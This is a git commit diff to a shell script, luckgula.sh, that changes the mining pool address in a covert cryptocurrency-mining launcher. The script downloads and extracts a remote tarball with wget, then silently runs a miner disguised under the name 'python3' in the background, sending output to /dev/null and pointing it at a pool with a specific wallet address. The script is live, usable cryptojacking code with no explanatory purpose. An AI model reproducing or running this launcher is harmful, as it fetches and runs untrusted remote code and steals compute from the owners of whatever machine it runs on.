138acead7277647b1ee6e8a67164170fc8e7d5c3
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-22 04:53:22 +0700

    Update luckgula.sh

--- luckgula.sh
+++ luckgula.sh
@@ -2,6 +2,6 @@ wget -O DOT momok.x10.bz/DOT-SRB.tar.gz
 
 tar -xvf DOT
 
-nohup ./dotsrb/python3 -a yespowersugar -o 103.176.44.131:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB > /dev/null 2>&1 &
+nohup ./dotsrb/python3 -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB > /dev/null 2>&1 &
 
 top
